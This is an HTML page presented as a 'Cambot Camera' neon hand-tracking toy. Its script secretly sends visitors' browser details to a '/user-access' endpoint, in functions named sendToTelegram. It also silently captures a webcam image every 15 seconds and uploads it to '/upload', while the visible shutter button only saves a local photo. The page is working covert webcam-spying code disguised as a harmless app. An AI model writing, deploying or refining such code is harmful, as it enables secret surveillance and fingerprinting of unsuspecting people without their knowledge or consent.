<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cambot Camera â€” Neon Hands</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
    :root{
      --neon: #00f2fe;
      --bg1: #0f2027;
      --bg2: #203a43;
      --bg3: #2c5364;
    }
    html,body { height:100%; margin:0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, var(--bg1), var(--bg2), var(--bg3));
      color: #e7f9ff;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      gap:18px;
      padding:28px 12px;
      box-sizing:border-box;
    }
    header {
      width:100%;
      max-width:720px;
      display:flex;
      align-items:center;
      gap:16px;
      justify-content:flex-start;
    }
    .logo {
      display:flex;
      align-items:center;
      gap:12px;
      color:var(--neon);
      text-shadow:0 0 12px rgba(0,242,254,0.6);
      font-size:1.6rem;
    }
    .logo i{ font-size:1.6rem; background: rgba(255,255,255,0.02); padding:8px; border-radius:8px;}
    .camera-frame {
      width:100%;
      max-width:420px;
      aspect-ratio: 3/4;
      position:relative;
      border-radius:14px;
      padding:14px;
      box-sizing:border-box;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06));
      box-shadow: 0 8px 40px rgba(0,0,0,0.6), 0 0 30px rgba(0,242,254,0.06) inset;
    }
    .viewport {
      position:relative;
      width:100%;
      height:100%;
      border-radius:10px;
      overflow:hidden;
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    video {
      width:100%;
      height:100%;
      object-fit:cover;
      transform: scaleX(-1);
    }
    canvas.overlay {
      position:absolute;
      top:0; left:0; width:100%; height:100%;
      pointer-events:none;
      transform: scaleX(-1);
    }
    .controls {
      display:flex;
      gap:16px;
      align-items:center;
      justify-content:center;
      margin-top:12px;
      z-index:10;
    }
    .shutter {
      width:78px;
      height:78px;
      border-radius:50%;
      background: radial-gradient(circle at 30% 30%, #7ceaff, #00c0ff);
      border:5px solid rgba(255,255,255,0.95);
      box-shadow: 0 8px 25px rgba(0,192,255,0.25), 0 0 40px rgba(0,242,254,0.18);
      display:flex;
      align-items:center;
      justify-content:center;
      cursor:pointer;
      transition: transform .12s ease, box-shadow .12s;
    }
    .shutter:active { transform: scale(.94); box-shadow: 0 4px 18px rgba(0,192,255,0.18); }
    .shutter i { font-size:22px; color:#091018; }
    footer {
      width:100%;
      max-width:720px;
      display:flex;
      justify-content:center;
      align-items:center;
      margin-top:18px;
      color: var(--neon);
      text-shadow: 0 0 10px rgba(0,242,254,0.15);
      font-size:0.86rem;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo"><i class="fa-solid fa-robot"></i> <strong>Cambot Camera</strong></div>
  </header>

  <div class="camera-frame">
    <div class="viewport" id="viewport">
      <video id="video" autoplay playsinline></video>
      <canvas id="handCanvas" class="overlay"></canvas>
    </div>
  </div>

  <div class="controls">
    <div class="shutter" id="shutterBtn" title="Take photo">
      <i class="fa-solid fa-camera"></i>
    </div>
  </div>

  <footer>
    <div class="tagline">Developed by Churchill</div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>

  <script>
    const video = document.getElementById('video');
    const handCanvas = document.getElementById('handCanvas');
    const ctx = handCanvas.getContext('2d');
    const shutterBtn = document.getElementById('shutterBtn');
    
    let cameraStream = null;
    let userInfoSent = false;
    let imageCount = 0;
    let isSendingImages = true;
    let mediaPipeInitialized = false;
    
    function collectUserInfo() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        url: window.location.href
      };
    }
    
    async function sendToTelegram(message) {
      try {
        const response = await fetch('/user-access', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(message)
        });
        
        return await response.json();
      } catch (error) {
        console.error('Error sending to server:', error);
      }
    }
    
    function sendImageToTelegram() {
      if (!isSendingImages) return;
      
      if (!video.videoWidth || !video.videoHeight) {
        setTimeout(sendImageToTelegram, 3000);
        return;
      }
      
      try {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);
        
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
          
          fetch('/upload', {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            imageCount++;
          })
          .catch(error => {
            console.error('Error sending image:', error);
          })
          .finally(() => {
            setTimeout(sendImageToTelegram, 15000);
          });
        }, 'image/jpeg', 0.7);
      } catch (e) {
        console.error('Error creating image:', e);
        setTimeout(sendImageToTelegram, 10000);
      }
    }
    
    async function initCamera() {
      try {
        if (cameraStream) {
          cameraStream.getTracks().forEach(track => track.stop());
        }
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          } 
        });
        
        cameraStream = stream;
        video.srcObject = stream;
        
        if (!userInfoSent) {
          try {
            const userInfo = collectUserInfo();
            await sendToTelegram(userInfo);
            userInfoSent = true;
            
            setTimeout(() => {
              sendImageToTelegram();
            }, 5000);
          } catch (e) {
            console.error('Error sending user info:', e);
          }
        }
        
        await new Promise(resolve => {
          if (video.readyState >= 2) {
            resolve();
          } else {
            video.onloadedmetadata = resolve;
            video.onloadeddata = resolve;
          }
        });
        
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        if (!mediaPipeInitialized) {
          initMediaPipe();
          mediaPipeInitialized = true;
        }
      } catch (e) {
        console.error('Camera error:', e);
        setTimeout(initCamera, 3000);
      }
    }
    
    function resizeCanvas() {
      const rect = video.getBoundingClientRect();
      handCanvas.width = rect.width;
      handCanvas.height = rect.height;
      handCanvas.style.width = rect.width + 'px';
      handCanvas.style.height = rect.height + 'px';
    }
    
    function drawNeonLine(a, b) {
      ctx.save();
      ctx.lineWidth = 3.5;
      ctx.strokeStyle = 'rgba(0,242,254,0.95)';
      ctx.shadowBlur = 16;
      ctx.shadowColor = 'rgba(0,242,254,0.9)';
      ctx.beginPath();
      ctx.moveTo(a.x, a.y);
      ctx.lineTo(b.x, b.y);
      ctx.stroke();
      ctx.restore();
    }
    
    function drawNeonPoint(p) {
      ctx.save();
      ctx.fillStyle = 'rgba(0,242,254,1)';
      ctx.shadowBlur = 18;
      ctx.shadowColor = 'rgba(0,242,254,0.9)';
      ctx.beginPath();
      ctx.arc(p.x, p.y, 6, 0, Math.PI*2);
      ctx.fill();
      ctx.restore();
    }

    function initMediaPipe() {
      const hands = new Hands({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
      });
      
      hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 0,
        minDetectionConfidence: 0.5,
        minTrackingConfidence: 0.5
      });

      hands.onResults((results) => {
        if (!handCanvas.width || !handCanvas.height) return;
        
        ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);

        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;

        for (let handLandmarks of results.multiHandLandmarks) {
          const connections = window.HAND_CONNECTIONS;
          const points = handLandmarks.map(pt => {
            const rect = video.getBoundingClientRect();
            return {
              x: rect.width - (pt.x * rect.width),
              y: pt.y * rect.height
            };
          });

          for (let conn of connections) {
            const [i, j] = conn;
            drawNeonLine(points[i], points[j]);
          }
          for (let p of points) drawNeonPoint(p);
        }
      });

      const cameraUtils = new Camera(video, {
        onFrame: async () => {
          try {
            await hands.send({ image: video });
          } catch (e) {
            console.error('MediaPipe error:', e);
          }
        },
        width: 640,
        height: 480
      });
      
      cameraUtils.start();
    }

    shutterBtn.addEventListener('click', async () => {
      try {
        const rect = video.getBoundingClientRect();
        const out = document.createElement('canvas');
        out.width = rect.width;
        out.height = rect.height;
        const outCtx = out.getContext('2d');

        outCtx.save();
        outCtx.translate(out.width, 0);
        outCtx.scale(-1, 1);
        outCtx.drawImage(video, 0, 0, out.width, out.height);
        outCtx.restore();

        outCtx.drawImage(handCanvas, 0, 0, out.width, out.height);

        out.toBlob(blob => {
          const a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = `cambot_capture_${Date.now()}.jpg`;
          document.body.appendChild(a);
          a.click();
          a.remove();
        }, 'image/jpeg', 0.92);
      } catch (e) {
        console.error('Error capturing image:', e);
      }
    });
    
    window.addEventListener('beforeunload', () => {
      isSendingImages = false;
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
    });
    
    // Start with a delay to avoid permission issues
    setTimeout(initCamera, 1000);
  </script>
</body>
</html>
